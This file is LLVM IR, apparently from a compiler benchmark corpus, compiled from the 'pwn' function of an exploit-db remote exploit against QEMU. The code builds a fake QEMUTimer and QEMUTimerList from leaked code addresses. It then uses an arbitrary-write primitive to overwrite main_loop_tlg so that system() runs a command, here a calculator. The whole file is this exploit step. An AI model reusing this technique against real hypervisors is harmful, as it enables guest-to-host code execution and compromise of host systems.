; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_47320.c_pwn.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_47320.c_pwn.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.QEMUTimerList = type { i32, i32, i32, i32, i8*, i8*, i32*, i8* }
%struct.QEMUTimer = type { i32, i32, i8*, i8*, i8* }

@__const.pwn.cmd = private unnamed_addr constant [26 x i8] c"/usr/bin/gnome-calculator\00", align 16
@code_leak = common dso_local global i8* null, align 8
@FAKE_STRUCT = common dso_local global i32 0, align 4
@SYSTEM_PLT = common dso_local global i32 0, align 4
@QEMU_CLOCK = common dso_local global i32 0, align 4
@QEMU_TIMER_NOTIFY_CB = common dso_local global i32 0, align 4
@spray_id = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [29 x i8] c"Writing fake structure : %p\0A\00", align 1
@MAIN_LOOP_TLG = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [30 x i8] c"Overwriting main_loop_tlg %p\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @pwn() #0 {
  %1 = alloca [512 x i8], align 16
  %2 = alloca %struct.QEMUTimerList*, align 8
  %3 = alloca %struct.QEMUTimer*, align 8
  %4 = alloca [26 x i8], align 16
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i8*, align 8
  %11 = bitcast [512 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %11, i8 0, i64 512, i1 false)
  %12 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i64 0, i64 0
  %13 = bitcast i8* %12 to %struct.QEMUTimerList*
  store %struct.QEMUTimerList* %13, %struct.QEMUTimerList** %2, align 8
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i64 0, i64 0
  %15 = getelementptr inbounds i8, i8* %14, i64 48
  %16 = bitcast i8* %15 to %struct.QEMUTimer*
  store %struct.QEMUTimer* %16, %struct.QEMUTimer** %3, align 8
  %17 = bitcast [26 x i8]* %4 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %17, i8* align 16 getelementptr inbounds ([26 x i8], [26 x i8]* @__const.pwn.cmd, i32 0, i32 0), i64 26, i1 false)
  %18 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i64 0, i64 0
  %19 = getelementptr inbounds i8, i8* %18, i64 48
  %20 = getelementptr inbounds i8, i8* %19, i64 32
  %21 = getelementptr inbounds [26 x i8], [26 x i8]* %4, i64 0, i64 0
  %22 = call i32 @memcpy(i8* %20, i8* %21, i32 26)
  %23 = load i8*, i8** @code_leak, align 8
  %24 = load i32, i32* @FAKE_STRUCT, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr i8, i8* %23, i64 %25
  store i8* %26, i8** %5, align 8
  %27 = load i8*, i8** %5, align 8
  %28 = getelementptr i8, i8* %27, i64 48
  store i8* %28, i8** %6, align 8
  %29 = load i8*, i8** @code_leak, align 8
  %30 = load i32, i32* @SYSTEM_PLT, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr i8, i8* %29, i64 %31
  store i8* %32, i8** %7, align 8
  %33 = load i8*, i8** %6, align 8
  %34 = getelementptr i8, i8* %33, i64 32
  store i8* %34, i8** %8, align 8
  %35 = load i8*, i8** @code_leak, align 8
  %36 = load i32, i32* @QEMU_CLOCK, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr i8, i8* %35, i64 %37
  %39 = load %struct.QEMUTimerList*, %struct.QEMUTimerList** %2, align 8
  %40 = getelementptr inbounds %struct.QEMUTimerList, %struct.QEMUTimerList* %39, i32 0, i32 7
  store i8* %38, i8** %40, align 8
  %41 = load %struct.QEMUTimerList*, %struct.QEMUTimerList** %2, align 8
  %42 = getelementptr inbounds %struct.QEMUTimerList, %struct.QEMUTimerList* %41, i32 0, i32 6
  %43 = load i32*, i32** %42, align 8
  %44 = getelementptr inbounds i32, i32* %43, i64 48
  %45 = bitcast i32* %44 to i64*
  store i64 4294967296, i64* %45, align 8
  %46 = load i8*, i8** %6, align 8
  %47 = load %struct.QEMUTimerList*, %struct.QEMUTimerList** %2, align 8
  %48 = getelementptr inbounds %struct.QEMUTimerList, %struct.QEMUTimerList* %47, i32 0, i32 5
  store i8* %46, i8** %48, align 8
  %49 = load %struct.QEMUTimerList*, %struct.QEMUTimerList** %2, align 8
  %50 = getelementptr inbounds %struct.QEMUTimerList, %struct.QEMUTimerList* %49, i32 0, i32 0
  store i32 0, i32* %50, align 8
  %51 = load %struct.QEMUTimerList*, %struct.QEMUTimerList** %2, align 8
  %52 = getelementptr inbounds %struct.QEMUTimerList, %struct.QEMUTimerList* %51, i32 0, i32 1
  store i32 0, i32* %52, align 4
  %53 = load i8*, i8** @code_leak, align 8
  %54 = load i32, i32* @QEMU_TIMER_NOTIFY_CB, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr i8, i8* %53, i64 %55
  %57 = load %struct.QEMUTimerList*, %struct.QEMUTimerList** %2, align 8
  %58 = getelementptr inbounds %struct.QEMUTimerList, %struct.QEMUTimerList* %57, i32 0, i32 4
  store i8* %56, i8** %58, align 8
  %59 = load %struct.QEMUTimerList*, %struct.QEMUTimerList** %2, align 8
  %60 = getelementptr inbounds %struct.QEMUTimerList, %struct.QEMUTimerList* %59, i32 0, i32 2
  store i32 0, i32* %60, align 8
  %61 = load %struct.QEMUTimerList*, %struct.QEMUTimerList** %2, align 8
  %62 = getelementptr inbounds %struct.QEMUTimerList, %struct.QEMUTimerList* %61, i32 0, i32 3
  store i32 0, i32* %62, align 4
  %63 = load i8*, i8** %5, align 8
  %64 = load %struct.QEMUTimer*, %struct.QEMUTimer** %3, align 8
  %65 = getelementptr inbounds %struct.QEMUTimer, %struct.QEMUTimer* %64, i32 0, i32 4
  store i8* %63, i8** %65, align 8
  %66 = load i8*, i8** %7, align 8
  %67 = load %struct.QEMUTimer*, %struct.QEMUTimer** %3, align 8
  %68 = getelementptr inbounds %struct.QEMUTimer, %struct.QEMUTimer* %67, i32 0, i32 3
  store i8* %66, i8** %68, align 8
  %69 = load i8*, i8** %8, align 8
  %70 = load %struct.QEMUTimer*, %struct.QEMUTimer** %3, align 8
  %71 = getelementptr inbounds %struct.QEMUTimer, %struct.QEMUTimer* %70, i32 0, i32 2
  store i8* %69, i8** %71, align 8
  %72 = load %struct.QEMUTimer*, %struct.QEMUTimer** %3, align 8
  %73 = getelementptr inbounds %struct.QEMUTimer, %struct.QEMUTimer* %72, i32 0, i32 0
  store i32 1000000, i32* %73, align 8
  %74 = load %struct.QEMUTimer*, %struct.QEMUTimer** %3, align 8
  %75 = getelementptr inbounds %struct.QEMUTimer, %struct.QEMUTimer* %74, i32 0, i32 1
  store i32 -1, i32* %75, align 4
  %76 = call i32 (...) @rand()
  %77 = and i32 %76, 65535
  store i32 %77, i32* @spray_id, align 4
  store i64 122, i64* %9, align 8
  %78 = load i8*, i8** %5, align 8
  %79 = call i32 @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str, i64 0, i64 0), i8* %78)
  %80 = load i8*, i8** %5, align 8
  %81 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i64 0, i64 0
  %82 = load i64, i64* %9, align 8
  %83 = trunc i64 %82 to i32
  %84 = call i32 @arbitrary_write(i8* %80, i32 8, i8* %81, i32 %83, i32 32)
  %85 = call i32 (...) @rand()
  %86 = and i32 %85, 65535
  store i32 %86, i32* @spray_id, align 4
  %87 = load i8*, i8** @code_leak, align 8
  %88 = load i32, i32* @MAIN_LOOP_TLG, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr i8, i8* %87, i64 %89
  store i8* %90, i8** %10, align 8
  %91 = load i8*, i8** %10, align 8
  %92 = call i32 @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.1, i64 0, i64 0), i8* %91)
  %93 = load i8*, i8** %10, align 8
  %94 = bitcast i8** %5 to i8*
  %95 = call i32 @arbitrary_write(i8* %93, i32 8, i8* %94, i32 8, i32 32)
  ret void
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @rand(...) #2

declare dso_local i32 @printf(i8*, i8*) #2

declare dso_local i32 @arbitrary_write(i8*, i32, i8*, i32, i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
